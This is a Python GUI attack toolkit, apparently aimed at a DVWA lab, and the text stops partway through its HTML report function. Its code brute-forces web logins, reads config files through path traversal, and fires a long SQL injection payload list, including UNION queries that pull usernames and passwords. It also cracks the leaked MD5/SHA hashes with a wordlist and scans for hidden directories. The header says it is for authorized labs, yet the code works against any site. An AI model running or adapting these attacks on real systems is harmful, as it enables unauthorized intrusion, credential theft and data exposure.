#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HackerAI Toolkit — Multi Abas
  Aba 1: DVWA Brute Force + LFI
  Aba 2: SQLi Scanner (+ hash cracking + recon)  ' OR '1'='1 
  Aba 3: Login Brute Force Multi-Endpoint
  Aba 4: WP-Scanner (scan de arquivos + brute force wp-login/xmlrpc)

Tema verde hacker + senhas em laranja-abóbora. [VULN] laranja | [ OK ] azul.
Uso autorizado apenas (laboratório / pentest com permissão).
Dependências: pip install requests beautifulsoup4
"""

import threading
import queue
import itertools
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import urllib.parse
from urllib.parse import urljoin
import re
import time
import html
import webbrowser
import hashlib
import os
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========================= TEMA =========================
BG      = "#050805"
BG2     = "#0b120b"
FG      = "#00ff41"
FG_DIM  = "#00b32d"
ORANGE  = "#ff7518"   # laranja-abóbora
OK_C    = "#3a86ff"
SEL     = "#003b00"
BTN     = "#0a1a0a"
BTN_ACT = "#004d00"
MONO    = "Consolas"


def apply_theme(root):
    root.configure(bg=BG)
    style = ttk.Style()
    try:
        style.theme_use("clam")
    except tk.TclError:
        pass

    style.configure(".", background=BG, foreground=FG,
                    fieldbackground=BG2, bordercolor=FG_DIM,
                    lightcolor=FG_DIM, darkcolor=BG, troughcolor=BG2,
                    focuscolor=FG, font=(MONO, 10))
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG, font=(MONO, 10))
    style.configure("Orange.TLabel", background=BG, foreground=ORANGE,
                    font=(MONO, 10, "bold"))
    style.configure("TLabelframe", background=BG, bordercolor=FG_DIM)
    style.configure("TLabelframe.Label", background=BG, foreground=FG,
                    font=(MONO, 10, "bold"))
    style.configure("TButton", background=BTN, foreground=FG,
                    bordercolor=FG_DIM, focuscolor=FG, font=(MONO, 10, "bold"))
    style.map("TButton",
              background=[("active", BTN_ACT), ("disabled", "#101010")],
              foreground=[("disabled", "#2e4d2e")])
    style.configure("TEntry", fieldbackground=BG2, foreground=FG,
                    insertcolor=FG, bordercolor=FG_DIM)
    style.configure("TNotebook", background=BG, bordercolor=FG_DIM,
                    tabmargins=[2, 5, 2, 0])
    style.configure("TNotebook.Tab", background=BTN, foreground=FG_DIM,
                    padding=(18, 7), font=(MONO, 10, "bold"))
    style.map("TNotebook.Tab",
              background=[("selected", BG2)],
              foreground=[("selected", FG)])
    style.configure("TProgressbar", background=FG, troughcolor=BG2,
                    bordercolor=FG_DIM, lightcolor=FG, darkcolor=FG)

    style.configure("TCheckbutton", background=BG, foreground=FG,
                    focuscolor=FG, font=(MONO, 10))
    style.map("TCheckbutton",
              background=[("active", BG)],
              foreground=[("active", ORANGE)])
    style.configure("TSpinbox", fieldbackground=BG2, foreground=FG,
                    insertcolor=FG, bordercolor=FG_DIM, arrowcolor=FG,
                    background=BTN)
    style.configure("TCombobox", fieldbackground=BG2, background=BTN,
                    foreground=FG, arrowcolor=FG, bordercolor=FG_DIM,
                    selectbackground=SEL, selectforeground=FG)
    style.map("TCombobox",
              fieldbackground=[("readonly", BG2), ("disabled", "#101010")],
              foreground=[("readonly", FG), ("disabled", "#2e4d2e")],
              background=[("readonly", BTN), ("active", BTN_ACT)])
    root.option_add("*TCombobox*Listbox.background", BG2)
    root.option_add("*TCombobox*Listbox.foreground", FG)
    root.option_add("*TCombobox*Listbox.selectBackground", SEL)
    root.option_add("*TCombobox*Listbox.selectForeground", FG)
    root.option_add("*TCombobox*Listbox.font", (MONO, 10))


def make_log(parent):
    """ScrolledText com tema escuro. tags: 'pwd'/'vuln' laranja-abóbora, 'ok' azul."""
    w = scrolledtext.ScrolledText(
        parent, state="disabled", font=(MONO, 9),
        bg=BG2, fg=FG, insertbackground=FG,
        selectbackground=SEL, selectforeground=FG,
        highlightbackground=FG_DIM, highlightcolor=FG,
        relief="flat", borderwidth=0,
    )
    w.tag_config("pwd",  foreground=ORANGE, font=(MONO, 9, "bold"))
    w.tag_config("vuln", foreground=ORANGE, font=(MONO, 9, "bold"))
    w.tag_config("ok",   foreground=OK_C,   font=(MONO, 9, "bold"))
    return w


# --------- destaque automático de senhas no log ---------
PWD_RES = [
    re.compile(r"Testando:\s*\S+?:(\S+)"),
    re.compile(r"CREDENCIAL VÁLIDA:\s*(\S+\s*/\s*\S+)"),
    re.compile(r"CRACKED\s+\S+\s*=>\s*(\S+)"),
    re.compile(r"Admin[:/]\s*(\S+)"),
    re.compile(r"Testando:\s{2,}(\S+)"),
    re.compile(r"SENHA ENCONTRADA:\s*(\S+)"),
    re.compile(r"SENHA:\s*(\S+)"),
    re.compile(r"Senha salva em:\s*(\S+)"),
]


def _pwd_spans(line):
    spans = []
    for rx in PWD_RES:
        for m in rx.finditer(line):
            if m.group(1):
                spans.append((m.start(1), m.end(1)))
    return spans


def log_insert(widget, msg, tag="pwd"):
    widget.configure(state="normal")
    lines = msg.split("\n")
    for i, line in enumerate(lines):
        if "[VULN]" in line:
            line_tag = "vuln"
        elif "[ OK ]" in line:
            line_tag = "ok"
        else:
            line_tag = None
        line_tags = (line_tag,) if line_tag else ()

        spans = _pwd_spans(line)
        pos = 0
        for s, e in spans:
            if s > pos:
                widget.insert("end", line[pos:s], *line_tags)
            widget.insert("end", line[s:e], tag)
            pos = e
        widget.insert("end", line[pos:], *line_tags)
        if i < len(lines) - 1:
            widget.insert("end", "\n")
    widget.insert("end", "\n")
    widget.see("end")
    widget.configure(state="disabled")


# =====================================================================
# ABA 1 — DVWA BRUTE FORCE + LFI
# =====================================================================
class DvwaTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=8)
        self.running = False
        self.session = requests.Session()
        self._build_ui()

    def _build_ui(self):
        frame = ttk.LabelFrame(self, text=" Configuração — Brute Force + LFI ", padding=10)
        frame.pack(fill="x", padx=5, pady=5)

        ttk.Label(frame, text="URL Login:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(frame, width=58)
        self.url_entry.insert(0, "http://192.168.0.11/dvwa/login.php")
        self.url_entry.grid(row=0, column=1, pady=3)

        ttk.Label(frame, text="Wordlist (senhas):", style="Orange.TLabel").grid(row=1, column=0, sticky="w")
        self.wordlist_entry = ttk.Entry(frame, width=58)
        self.wordlist_entry.grid(row=1, column=1, pady=3)
        ttk.Button(frame, text="Procurar...", command=self._browse).grid(row=1, column=2, padx=6)

        ttk.Label(frame, text="Usuário:").grid(row=2, column=0, sticky="w")
        self.user_entry = ttk.Entry(frame, width=30)
        self.user_entry.insert(0, "admin")
        self.user_entry.grid(row=2, column=1, sticky="w", pady=3)

        ttk.Label(frame, text="Arquivo alvo (LFI):").grid(row=3, column=0, sticky="w")
        self.file_entry = ttk.Entry(frame, width=58)
        self.file_entry.insert(0, "/var/www/dvwa/config/config.inc.php")
        self.file_entry.grid(row=3, column=1, pady=3)

        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=4, column=1, sticky="w", pady=5)
        self.btn_start = ttk.Button(btn_frame, text=">> Iniciar", command=self.start)
        self.btn_start.pack(side="left", padx=3)
        self.btn_stop = ttk.Button(btn_frame, text="[] Parar", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=3)

        out_frame = ttk.LabelFrame(self, text=" Saída ", padding=5)
        out_frame.pack(fill="both", expand=True, padx=5, pady=5)
        self.log = make_log(out_frame)
        self.log.pack(fill="both", expand=True)

    def _browse(self):
        path = filedialog.askopenfilename(title="Selecione a wordlist de senhas")
        if path:
            self.wordlist_entry.delete(0, "end")
            self.wordlist_entry.insert(0, path)

    def log_msg(self, msg):
        log_insert(self.log, msg)

    def start(self):
        url = self.url_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        if not url or not wordlist:
            messagebox.showerror("Erro", "Informe a URL e a wordlist.")
            return
        if not os.path.isfile(wordlist):
            messagebox.showerror("Erro", "Wordlist não encontrada.")
            return
        self.session = requests.Session()
        self.running = True
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        threading.Thread(target=self.run, args=(url, wordlist), daemon=True).start()

    def stop(self):
        self.running = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")

    def _get_token(self, url):
        r = self.session.get(url, verify=False, timeout=10)
        m = re.search(r"user_token'?\s*value='([^']+)'", r.text)
        return m.group(1) if m else None

    def _save_found(self, content, tag):
        fname = f"encontrado_{tag}.txt"
        with open(fname, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        self.log_msg(f"[+] Conteúdo salvo em: {os.path.abspath(fname)}")

    def run(self, url, wordlist):
        base = url.rsplit("/", 1)[0]

        self.log_msg("[*] Fase 1: Brute force no login")
        creds = None
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f
                             if l.strip() and not l.lstrip().startswith("#")]
        except Exception as e:
            self.log_msg(f"[!] Erro ao ler wordlist: {e}")
            self._done()
            return

        self.log_msg(f"\n[*] {len(passwords)} senhas carregadas\n")

        for pwd in passwords:
            if not self.running:
                break
            try:
                token = self._get_token(url)
                data = {
                    "username": self.user_entry.get().strip(),
                    "password": pwd,
                    "Login": "Login",
                }
                if token:
                    data["user_token"] = token
                r = self.session.post(url, data=data, verify=False, timeout=10,
                                      allow_redirects=True)
                if "login.php" not in r.url and r.status_code == 200:
                    self.log_msg(f"\n[+] CREDENCIAL VÁLIDA: {data['username']} / {pwd}\n\n")
                    creds = (data["username"], pwd)
                    break
                self.log_msg(f"    Testando: {data['username']}:{pwd:<50} -> falha")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not creds:
            self.log_msg("\n[-] Nenhuma credencial encontrada. Continuando teste LFI sem login\n")

        target_file = self.file_entry.get().strip()
        self.log_msg(f"[*] Fase 2: Testando LFI para {target_file}\n")

        traversal = "../" * 6 + target_file.lstrip("/")
        candidates = [
            traversal,
            traversal.replace("../", "....//"),
            "/" + target_file.lstrip("/"),
            "..\\..\\" * 6 + target_file.lstrip("/"),
        ]

        lfi_url = f"{base}/vulnerabilities/fi/?page="
        found = False
        for payload in candidates:
            if not self.running or found:
                break
            try:
                r = self.session.get(lfi_url + payload, verify=False, timeout=10)
                if "db_" in r.text or "$_DVWA" in r.text or "config.inc" in r.text:
                    self.log_msg(f"[+] ARQUIVO ENCONTRADO via payload: {payload}")
                    self._save_found(r.text, "lfi_config")
                    found = True
                else:
                    self.log_msg(f"    Tentativa '{payload[:60]}...' -> sem conteúdo do config")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not found:
            self.log_msg("\n[-] LFI não confirmado. Verifique se está logado e se o nível")
            self.log_msg("    de segurança do DVWA está em: low     (http://SEU_IP/dvwa/security.php)\n")

        self._done()

    def _done(self):
        self.running = False
        self.after(0, lambda: (self.btn_start.configure(state="normal"),
                               self.btn_stop.configure(state="disabled")))
        self.log_msg("\n\n[*] Finalizado\n\n")


# =====================================================================
# ABA 2 — SQLi SCANNER
# =====================================================================
TIMEOUT = 10
RECON_THREADS = 5

PAYLOADS = [
    ("'", "Erro SQL clássico"),
    ("1'", "Erro de sintaxe após número"),
    ("1' AND extractvalue(1, concat(0x7e, version()))-- ", "Error-based MySQL extractvalue"),
    ("1' AND updatexml(1, concat(0x7e, version()), 1)-- ", "Error-based MySQL updatexml"),
    ("1' AND 1=CONVERT(int, @@version)-- ", "Error-based MSSQL"),
    ("' OR '1'='1", "Bypass clássico string"),
    ("1' OR '1'='1", "Bypass de autenticação (OR 1=1)"),
    ("1 OR 1=1", "Bypass numérico"),
    ("1' OR '1'='1' -- ", "Bypass com comentário"),
    ("' OR 1=1#", "Bypass hash comment"),
    ("admin'-- ", "Login bypass admin"),
    ("1 AND 1=1", "Booleano TRUE (baseline)"),
    ("1 AND 1=2", "Booleano FALSE"),
    ("1' AND '1'='1", "Booleano string TRUE"),
    ("1' AND '1'='2", "Booleano string FALSE"),
    ("1' AND SLEEP(5)-- ", "Time-based MySQL"),
    ("1 AND SLEEP(5)", "Time-based MySQL numérico"),
    ("1'; WAITFOR DELAY '0:0:5'-- ", "Time-based MSSQL"),
    ("1' AND pg_sleep(5)-- ", "Time-based PostgreSQL"),
    ("1' AND BENCHMARK(5000000, SHA1('t'))-- ", "Time-based BENCHMARK"),
    ("1 UNION SELECT NULL-- ", "UNION 1 coluna"),
    ("1 UNION SELECT NULL,NULL-- ", "UNION 2 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL-- ", "UNION 3 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL-- ", "UNION 4 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "UNION 5 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "UNION 6 colunas"),
    ("1' UNION SELECT NULL,NULL-- ", "UNION string 2 colunas"),
    ("1' UNION SELECT NULL,NULL,NULL-- ", "UNION string 3 colunas"),
    ("1' UNION SELECT version(),database()-- ", "UNION extraindo versão/banco"),
    ("1' UNION SELECT table_name,NULL FROM information_schema.tables-- ", "UNION listando tabelas"),
    ("1' UNION SELECT user,password FROM users-- ", "UNION extraindo credenciais (DVWA)"),
    ("1' UNION SELECT @@version,@@datadir-- ", "UNION MSSQL/MySQL info"),
    ("1/**/OR/**/1=1", "Inline comments"),
    ("1 /*!50000OR*/ 1=1", "MySQL version comment"),
    ("1 OR 0x31=0x31", "Hex encoding"),
    ("1 %00OR 1=1", "Null byte"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "mysql_fetch", "pg_query",
    "sqlite3.operationalerror", "ora-01756", "microsoft ole db provider",
    "odbc sql server driver", "syntax error", "unterminated string",
    "sqlsyntaxerrorexception", "error in your sql",
]

HASH_PATTERNS = [
    (r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}", "bcrypt"),
    (r"\$argon2(?:id|i|d)\$[^\s\"'<>]{20,}", "argon2"),
    (r"\b[a-fA-F0-9]{128}\b", "SHA-512"),
    (r"\b[a-fA-F0-9]{96}\b", "SHA-384"),
    (r"\b[a-fA-F0-9]{64}\b", "SHA-256"),
    (r"\b[a-fA-F0-9]{40}\b", "SHA-1"),
    (r"\b[a-fA-F0-9]{32}\b", "MD5"),
    (r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b", "JWT"),
]

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (SQLi-Scanner-GUI; Auth-Test)"


def extract_data(body):
    out = []
    for pattern in (
        r"ID:\s*([^<\r\n]+)",
        r"First\sname:\s*([^<\r\n]+)",
        r"Surname:\s*([^<\r\n]+)",
    ):
        for item in re.findall(pattern, body, re.I):
            item = re.sub(r"<[^>]+>", "", item).strip()
            if item and item not in out:
                out.append(item)
    rows = re.findall(
        r"<tr[^>]*>\s*<td[^>]*>(.*?)</td>\s*<td[^>]*>(.*?)</td>",
        body, re.I | re.S,
    )
    for a, b in rows[:20]:
        a = re.sub(r"<[^>]+>", "", a).strip()
        b = re.sub(r"<[^>]+>", "", b).strip()
        if a or b:
            out.append(f"{a} | {b}")
    return list(dict.fromkeys(out))


def find_hashes(text):
    found = []
    seen = set()
    for pattern, htype in HASH_PATTERNS:
        for m in re.finditer(pattern, text):
            h = m.group(0)
            if h.lower() in seen:
                continue
            seen.add(h.lower())
            start = max(0, m.start() - 40)
            end = min(len(text), m.end() + 40)
            ctx = re.sub(r"\s+", " ", text[start:end]).strip()
            found.append((htype, h, ctx))
    return found


def algos_for_hash(h):
    n = len(h)
    if n == 32:
        return [("md5", hashlib.md5)]
    if n == 40:
        return [("sha1", hashlib.sha1)]
    if n == 64:
        return [("sha256", hashlib.sha256)]
    if n == 96:
        return [("sha384", hashlib.sha384)]
    if n == 128:
        return [("sha512", hashlib.sha512)]
    return []


class SqliTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=10)
        self.columnconfigure(1, weight=1)
        self.rowconfigure(6, weight=1)
        self._build_ui()
        self.results = []
        self.findings = []
        self.hash_findings = []
        self.recon_findings = []

    def _build_ui(self):
        ttk.Label(self, text="URL alvo:").grid(row=0, column=0, sticky="w")
        self.url = ttk.Entry(self)
        self.url.grid(row=0, column=1, padx=5, sticky="ew")
        self.url.insert(0, "http://192.168.0.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit")

        ttk.Label(self, text="Cookie:").grid(row=1, column=0, sticky="w")
        self.cookie = ttk.Entry(self)
        self.cookie.grid(row=1, column=1, padx=5, sticky="ew")
        self.cookie.insert(0, "PHPSESSID=329f6tjl62ekmjrpibd5kor3f5; security=low")

        ttk.Label(self, text="POST:").grid(row=2, column=0, sticky="w")
        self.post = ttk.Entry(self)
        self.post.grid(row=2, column=1, padx=5, sticky="ew")
        self.post.insert(0, "Submit=Submit")

        ttk.Label(self, text="Wordlist (senhas):", style="Orange.TLabel").grid(row=3, column=0, sticky="w")
        self.wordlist = ttk.Entry(self)
        self.wordlist.grid(row=3, column=1, padx=5, sticky="ew")
        ttk.Button(self, text="Procurar...", command=self.browse_wordlist).grid(row=3, column=2, padx=8, sticky="ew")

        self.btn = ttk.Button(self, text=">> Escanear SQLi", command=self.start)
        self.btn.grid(row=0, column=2, rowspan=2, padx=8, sticky="ew")

        self.btn_crack = ttk.Button(self, text=">> Quebrar Hashes", command=self.start_crack)
        self.btn_crack.grid(row=4, column=0, columnspan=3, padx=0, pady=(6, 0), sticky="ew")

        self.progress = ttk.Progressbar(self, mode="determinate", maximum=100)
        self.progress.grid(row=5, column=0, columnspan=3, sticky="ew", pady=(6, 0))

        self.log = make_log(self)
        self.log.configure(wrap="none")
        self.log.grid(row=6, column=0, columnspan=3, sticky="nsew", pady=10)

        ttk.Button(self, text="[ Salvar relatório HTML ]", command=self.save).grid(row=7, column=1)

    # ---------- logging ----------
    def write(self, text):
        self.after(0, self._write, text)

    def _write(self, text):
        log_insert(self.log, text)

    def set_progress(self, value):
        value = max(0, min(100, value))
        self.after(0, lambda: self.progress.config(value=value))

    def busy(self, on):
        def _do():
            if on:
                self.progress.config(value=0)
                self.btn.config(state="disabled")
                self.btn_crack.config(state="disabled")
            else:
                self.progress.config(value=100)
                self.btn.config(state="normal")
                self.btn_crack.config(state="normal")
        self.after(0, _do)

    # ---------- cookies ----------
    def cookies(self):
        result = {}
        for item in self.cookie.get().split(";"):
            if "=" in item:
                k, v = item.strip().split("=", 1)
                result[k] = v
        return result

    def browse_wordlist(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist de senhas (ex.: rockyou.txt)",
            filetypes=[("Listas de palavras", "*.txt *.lst *.wordlist"),
                       ("Todos os arquivos", "*.*")],
        )
        if path:
            self.wordlist.delete(0, "end")
            self.wordlist.insert(0, path)
            size = os.path.getsize(path) if os.path.isfile(path) else 0
            self.write(f"[*] Wordlist selecionada: {path} ({size/1024/1024:.1f} MB)\n")

    def load_recon_wordlist(self, path):
        words, seen = [], set()
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    w = line.strip()
                    if not w or w.startswith("#"):
                        continue
                    w = w.lstrip("/")
                    if w in seen:
                        continue
                    seen.add(w)
                    words.append(w)
        except OSError as e:
            self.write(f"[ERRO] Lendo wordlist: {e}")
            return []
        return words

    # ---------- request helpers ----------
    def request_data(self, url, param, payload):
        p = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        if qs:
            qs[param] = [payload]
            q = urllib.parse.urlencode(qs, doseq=True)
            return urllib.parse.urlunparse(p._replace(query=q)), None
        data = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
        if param not in data:
            return None, None
        data[param] = [payload]
        return url, data

    def send(self, url, data=None):
        t = time.time()
        try:
            if data is not None:
                r = session.post(url, data=data, timeout=TIMEOUT)
            else:
                r = session.get(url, timeout=TIMEOUT)
            return r, time.time() - t, None
        except requests.RequestException as e:
            return None, 0, str(e)

    # ========================= SQLi =========================
    def start(self):
        url = self.url.get().strip()
        if not url:
            return
        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.log.delete("1.0", "end")
        self.results.clear()
        self.findings.clear()
        self.hash_findings.clear()
        self.recon_findings.clear()
        self.busy(True)
        threading.Thread(target=self.scan, args=(url,), daemon=True).start()

    def scan(self, url):
        try:
            p = urllib.parse.urlparse(url)
            get = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            post = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
            params = get or post
            params = [x for x in params if x.lower() != "submit"]

            self.write(f"[*] Alvo: {url}")

            if not params:
                self.write("[!] Nenhum parâmetro encontrado.")
                return

            base, _, err = self.send(url, post if not get else None)
            base_len = len(base.text) if base else 0
            base_status = base.status_code if base else 0

            if err:
                self.write(f"[!] Request base: {err}")

            if base:
                for htype, h, ctx in find_hashes(base.text):
                    self._register_hash(htype, h, ctx, url)

            steps_per_param = 2 + len(PAYLOADS)
            total_steps = len(params) * steps_per_param
            done_steps = 0

            def tick():
                nonlocal done_steps
                done_steps += 1
                self.set_progress(int(done_steps * 100 / total_steps))

            self.set_progress(0)

            for param in params:
                self.write(f"\n[>] Testando: {param}\n")
                true_len = false_len = None

                for payload, tag in (("1 AND 1=1", "TRUE"), ("1 AND 1=2", "FALSE")):
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue
                    r, _, _ = self.send(u, data)
                    if not r:
                        continue
                    if tag == "TRUE":
                        true_len = len(r.text)
                    else:
                        false_len = len(r.text)

                blind = (true_len is not None and false_len is not None
                         and abs(true_len - false_len) > 20)
                if blind:
                    self.write(f"[+] Diferença booleana: TRUE={true_len} FALSE={false_len}")

                for payload, desc in PAYLOADS:
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue

                    r, elapsed, error = self.send(u, data)
                    if not r:
                        self.write(f"[-] {error}")
                        continue

                    body = r.text.lower()
                    vuln = None

                    for e in SQL_ERRORS:
                        if e in body:
                            vuln = f"Erro SQL: {e}"
                            break

                    if (not vuln and elapsed > 5 and any(
                            x in payload.lower()
                            for x in ("sleep", "waitfor", "benchmark", "pg_sleep"))):
                        vuln = f"Resposta lenta: {elapsed:.1f}s"

                    if (not vuln and true_len is not None and false_len is not None
                            and blind and ("1=1" in payload or "'1'='1" in payload)):
                        if (abs(len(r.text) - true_len) < 50
                                and "and" in payload.lower() and "1=2" not in payload):
                            vuln = "Resposta semelhante ao TRUE"

                    if (not vuln and ("or 1=1" in payload.lower() or "or '1'='1" in payload.lower())
                            and abs(len(r.text) - base_len) > 100):
                        vuln = f"Conteúdo alterado: {base_len} -> {len(r.text)} bytes"

                    if not vuln and "union select" in payload.lower():
                        if base_status and r.status_code != base_status:
                            vuln = f"UNION alterou status: {base_status}->{r.status_code}"
                        elif abs(len(r.text) - base_len) > 100:
                            vuln = "UNION alterou o conteúdo"

                    leaked = []
                    if vuln or any(x in payload.lower()
                                   for x in ("union select", "information_schema", "from users")):
                        leaked = extract_data(r.text)
                        for htype, h, ctx in find_hashes(r.text):
                            self._register_hash(htype, h, ctx, u)

                    item = (param, payload, r.status_code, elapsed,
                            bool(vuln), desc, vuln, len(r.text), leaked)
                    self.results.append(item)

                    if vuln:
                        self.findings.append((param, payload, desc, vuln, u, leaked))
                        self.write(f"\n[VULN] {param} | {payload[:35]} | {r.status_code} | {elapsed:.1f}s\n")
                        for x in leaked[:10]:
                            self.write(f"       {x}")
                    else:
                        self.write(f"\n\n[ OK ] {param} | {payload[:35]} | {r.status_code} | {elapsed:.1f}s\n")

                    time.sleep(0.15)

            self.write(f"\n[*] Concluído: {len(self.findings)} achados")
            if self.hash_findings:
                self.write(f"\n[*] Hashes Encontrados: {len(self.hash_findings)}")

            path = self.wordlist.get().strip()
            self.auto_crack(path)
        except Exception as e:
            self.write(f"\n[ERRO] {e}")
        finally:
            self.busy(False)

    # ========================= HASHES =========================
    def _register_hash(self, htype, h, ctx, source):
        for item in self.hash_findings:
            if item[1].lower() == h.lower():
                return
        self.hash_findings.append((htype, h, ctx, source, None))
        self.write(f"[HASH] {htype}: {h}")

    # ========================= CRACKING =========================
    def build_targets(self):
        targets = {}
        for idx, (htype, h, ctx, source, cracked) in enumerate(self.hash_findings):
            candidates = algos_for_hash(h)
            if not candidates:
                continue
            targets.setdefault(h.lower(), []).append(idx)
        return targets

    def auto_crack(self, path):
        if not self.hash_findings:
            return
        if not path or not os.path.isfile(path):
            if self.hash_findings:
                self.write("\n\n[*] Nenhuma wordlist selecionada — hashes não serão quebrados automaticamente.")
            return
        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.\n")
            return
        self.write("\n[*] Wordlist detectada — iniciando cracking automático\n")
        self.run_crack(path, targets)

    def start_crack(self):
        if not self.hash_findings:
            self.write("[!] Nenhum hash encontrado ainda. Faça o Escanear SQLi primeiro\n")
            return
        path = self.wordlist.get().strip()
        if not path or not os.path.isfile(path):
            self.write("[!] Selecione uma wordlist válida (botão Procurar...).")
            return
        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.")
            return
        self.busy(True)
        self.write(f"[*] Iniciando ataque de dicionário\n[*] Wordlist: {path}\n\n"
                   f"[*] Hashes alvo: {len(targets)}\n")
        threading.Thread(target=self.crack_worker, args=(path, targets), daemon=True).start()

    def crack_worker(self, path, targets):
        try:
            self.run_crack(path, targets)
        finally:
            self.busy(False)

    def run_crack(self, path, targets):
        try:
            total_size = os.path.getsize(path)
            processed = 0
            found = {}
            remaining = set(targets.keys())
            start = time.time()

            self.write(f"[*] Wordlist: {path}\n\n[*] Hashes alvo: {len(targets)}\n\n")

            with open(path, "rb") as fh:
                for raw in fh:
                    word = raw.strip()
                    if not word:
                        continue
                    still = set(remaining)
                    for h in still:
                        for _, fn in algos_for_hash(h):
                            if fn(word).hexdigest() == h:
                                found[h] = word.decode("utf-8", "ignore")
                                remaining.discard(h)
                                break
                    processed += len(raw)
                    if processed % (1 << 20) < len(raw):
                        pct = int(processed * 100 / total_size) if total_size else 0
                        self.set_progress(pct)
                    if not remaining:
                        break

            elapsed = time.time() - start

            for h, word in found.items():
                for idx in targets[h]:
                    htype, hh, ctx, source, _ = self.hash_findings[idx]
                    self.hash_findings[idx] = (htype, hh, ctx, source, word)

            for h, word in found.items():
                self.write(f"[+] CRACKED  {h}  =>  {word}")
            for h in remaining:
                self.write(f"\n\n[-] Não quebrado: {h}")

            self.write(f"\n[*] Cracking concluído em {elapsed:.1f}s "
                       f"({len(found)}/{len(targets)} quebrados, {processed/1024/1024:.1f} MB lidos)\n\n")
        except Exception as e:
            self.write(f"[ERRO] Cracking: {e}")

    # ========================= RECON =========================
    def start_recon(self):
        url = self.url.get().strip()
        if not url:
            self.write("[!] Informe a URL alvo antes do recon.")
            return
        wordlist_path = filedialog.askopenfilename(
            title="Selecione a wordlist de diretórios/arquivos",
            filetypes=[("Listas de palavras", "*.txt *.lst *.wordlist"),
                       ("Todos os arquivos", "*.*")],
        )
        if not wordlist_path:
            self.write("[!] Recon cancelado: nenhuma wordlist selecionada.")
            return
        words = self.load_recon_wordlist(wordlist_path)
        if not words:
            self.write("[!] Wordlist vazia ou ilegível.")
            return
        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.recon_findings.clear()
        self.busy(True)
        self.write(f"[*] Recon em {url}\n[*] Wordlist: {wordlist_path} ({len(words)} entradas)\n")
        threading.Thread(target=self.recon, args=(url, words), daemon=True).start()

    def recon(self, url, words):
        total = len(words)
        done = 0
        try:
            base = url.rstrip("/") + "/"

            def probe(entry):
                target = entry if entry.startswith(("http://", "https://")) else urllib.parse.urljoin(base, entry)
                r, elapsed, err = self.send(target)
                return entry, target, r, elapsed, err

            with ThreadPoolExecutor(max_workers=RECON_THREADS) as pool:
                futures = {pool.submit(probe, w): w for w in words}
                for fut in as_completed(futures):
                    entry, target, r, elapsed, err = fut.result()
                    done += 1
                    if done % 25 == 0 or done == total:
                        self.write(f"[*] Progresso: {done}/{total}")
                    if err or not r:
                        continue
                    if r.status_code in (200, 301, 302, 401, 403, 500):
                        self.recon_findings.append((entry, r.status_code, len(r.text), elapsed, target))
                        self.write(f"[{r.status_code}] /{entry} ({len(r.text)} bytes, {elapsed:.1f}s)")
                        server = r.headers.get("Server")
                        if server:
                            self.write(f"      Server: {server}")
            self.write(f"\n[*] Recon concluído: {len(self.recon_findings)} recursos interessantes")
        except Exception as e:
            self.write(f"[ERRO] Recon: {e}")
        finally:
            self.busy(False)

    # ========================= REPORT =========================
    def save(self):
        if not self.results and not self.hash_findings and not self.recon_findings:
            self.write("[!] Nenhum resultado.")
            return
        filename = filedialog.asksaveasfilename(
            defaultextension=".html", filetypes=[("HTML", "*.html")]
        )
        if not filename:
            return

        rows = ""
        for (param, payload, status, elapsed, vuln, desc, detail, length, leaked) in self.results:
            color = "#3a0d0d" if vuln else "#0d3a12"
            badge = ('<b style="color:#ff7518">VULN</b>' if vuln
                     else '<b style="color:#3a86ff">OK</b>')
            leak = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:15])
            rows += f"""
        <tr style="background:{color};color:#00ff41">
          <td>{html.escape(param)}</td>
          <td><code>{html.escape(payload)}</code></td>
          <td>{html.escape(desc)}</td>
          <td>{status}</td>
          <td>{length}</td>
          <td>{elapsed:.1f}s</td>
          <td>{badge}</td>
          <td>{html.escape(detail or "-")}<ul>{leak}</ul></td>
        </tr>
        """

        findings = ""
